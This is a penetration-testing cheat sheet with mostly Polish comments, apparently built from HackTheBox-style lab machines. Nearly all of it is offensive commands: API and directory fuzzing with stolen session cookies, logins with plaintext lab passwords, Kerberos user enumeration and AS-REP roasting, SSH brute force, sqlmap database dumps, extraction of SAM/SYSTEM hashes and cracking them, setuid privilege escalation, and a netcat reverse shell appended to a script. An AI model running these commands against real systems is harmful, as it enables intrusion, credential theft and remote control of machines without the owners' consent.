
# Penetration Testing Cookbook - Part 1

This document serves as a reference for various penetration testing commands and techniques.

---

#Diagnozowanie podejrzanych .doc
```bash
oleid diagnostic.doc
```

#sprawdzanie relacji
```bash
oleobj diagnostic.doc
```

#Fuzzowanie API
```bash
wfuzz -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt -u http://206.189.113.236:32119/api/list/FUZZ/?secret=d0daC83Aa4B4719 -H "Cookie: session=eyJhdXRoZW50aWNhdGlvbiI6InVzZXJBRWViMTE2RiJ9.YUuLGg.8hb4Rle7WzIlDcAQzwrJKgVauzY" --hh 24
```

#Radare2 – Zaawansowane narzędzie do inżynierii wstecznej i analizy binarnej

#dekompilacja .apk
```bash
apktool d instant.apk
```

#dekoplikacja bin wchodzenie do bin w celu przeczytania
```bash
binwalk -e firmware.bin
grep -rn "./" -e login
```

#RDP do Windows
```bash
evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

#swietna enumeracja po smb
```bash
export PYTHONPATH=$PYTHONPATH:/tools/impacket/lib/python3.12/site-packages
```

#potem mozesz sobie te konta sprwadzic na tym
```bash
kerbrute userenum --dc 10.129.5.101 -d cicada.htb username.txt
```

#shel mozna testowac tak
```bash
nxc smb 10.129.5.101 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

#dekodowanie z base64
```bash
base64 -d HR_Policies.pdf > HR-decoded
```

#enumeracja git
```bash
git_dumper
```

#prosta eksalacja
```bash
echo 'import os; os.system("bash")' >
```

#zamazane obrazki
```bash
pdfimages Using\ OpenVAS.pdf test
python3 depix.py -p test-000.ppm -s images/searchimages/debruinseq_notepad_Windows10_closeAndSpaced.png
```

#amanie klucza prywatnego
```bash
python3 RsaCtfTool.py --publickey key.pub --attack factordb --private
```

#wpscan do skanu wordpressa
```bash
wpscan --url http://metapress.htb/ -e u
```

#Evil-winrm do laczenia sie do Windowsow, ma od razu powershell i mozna wrzuciac pliki
```bash
evil-winrm -i $IP -u svc-alfresco -p 's3rvice'
```

#Impacket
```bash
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt -dc-ip $IP
```

#shell
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#hydra co tworzy polaczenia na podstawie podanych loginow i hasla
```bash
hydra -L users.txt -P pass.txt 10.10.10.215 -t 4 ssh
```

#anon FTP
```bash
ftp ftp://anonymous:''@10.10.10.5
wget --no-passive-ftp -r ftp://anonymous:ftp@10.10.10.98/Backups
```

#enumeracja
```bash
nxc smb IP -u '' -p '' --users
enum4linux -d -r -o 10.10.10.161
enum4linux-ng -A 10.10.10.161 | tee enum.out
```

#Autorecon
```bash
autorecon 10.10.10.100
```

#Odpytywanie API CURL
```bash
curl -XPOST http://2million.htb/api/v1/invite/generate
```

#Lista API Cookie z sesji zalogowane usera
```bash
curl http://2million.htb/api/v1 -l -H 'Cookie: PHPSESSID=3igvoarfjcm4uq2n9jkkuv0215' -s | jq .
```

# Penetration Testing Cookbook - Part 2

This document continues as a reference for various penetration testing commands and techniques.

---

#Anonimowe logowania
```bash
ftp ftp://anonymous:''@10.10.10.161
ldapsearch -x -H ldap://10.10.10.161 -b "" -s base
smbclient -L //<adres_IP_serwera> -N
evil-winrm -i <adres_IP_serwera> -u <użytkownik> -p <hasło>
rpcclient -U "" -N 10.10.10.161
```

#NMAP
```bash
# Port scanning and vulnerability detection
nmap -p- -sVC 10.10.11.242 -Pn -oN versionScan
nmap -p- -T5 10.129.235.111
nmap -Pn -p- --min-rate 2000 -sC -sV -oN nmap-scan.txt 10.129.221.161
nmap -v -script smb-vuln* -p 139,445 10.129.235.111
```

#bazy danych
```bash
mdb-tables backup.mdb
mdb-export backup.mdb nazwa_tabeli
```

#mocny skaner
```bash
feroxbuster -u http://goodgames.htb
gobuster dir -u http://10.10.10.75/nibbleblog/ --wordlist /usr/share/dirb/wordlists/common.txt
gobuster vhost -u http://devvortex.htb -w /usr/share/SecLists/Discovery/Web-Content/common.txt
```

#SQL MAP badanie sql injection
```bash
sqlmap -r request.txt --ignore-code 401
sqlmap -r request –dbs --batch
sqlmap -r request -D main --dump-all --batch
```

#SMB bez usera
```bash
smbmap -H 10.10.10.100
smbclient -L //10.10.10.100 -N
crackmapexec smb 10.10.10.100 --shares -u '' -p ''
```

#import shell
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

# one line reverse shell
```bash
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 10.10.16.40 5555 >/tmp/f' | tee -a monitor.sh
```

#FUZZ
```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://itrc.ssg.htb/?page=FUZZ -b "PHPSESSID=9d8f0d53fe02af65d4058f0777d73103" -recursion -fs 3120
```

#Dirsearch
```bash
dirsearch -u http://sea.htb
```

# sprawdzenie komend sudo
```bash
sudo -l
```

#metasploit
- wyszukaj poprzez `search`
- nawiaz sesje meterpreter, a nastepnie daj ja na background
- wpisz `search local_exploit_suggester`, use 0, set session 1, run

#BloodHound - narzedzie do ad
```bash
bloodhound-python -d htb.local -ns 10.10.10.161 -u svc-alfresco -p s3rvice -c all --zip
sudo neo4j start
```

#eskalacja python
```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#cracking hasla
```bash
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt pass.txt
hashcat -m 3200 -a 0 pass.txt /usr/share/wordlists/rockyou.txt
```

#haslo md5
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
```

#Hacking drukarki by PRET
```bash
python pret.py 83.136.255.40:43536 pjl
```

#Obrazy VHD, latwe montowanie
```bash
sudo guestmount -a mnt/smb/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd -i --ro mnt/vhd
```

#Hackowanie windows SAM and SYSTEM hives and extrackt NTLM hases of local user account
```bash
cd Windows/System32/config
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

#Gdy znajdziemy hashe poprzednim poleceniem to mozemy je wrzucic w hashcat
```bash
hashcat -m 1000 26112010952d963c8dc4217daec986d9 /opt/rockyou.txt
```

#zapisane credentaiale na windows
```bash
cmdkey /list
```

#Runas uruchamianie z zapisanymi credami jako admin
```bash
runas.exe /savedcred /user:administrator: "cmd /c"
```

---

This concludes the penetration testing commands reference.
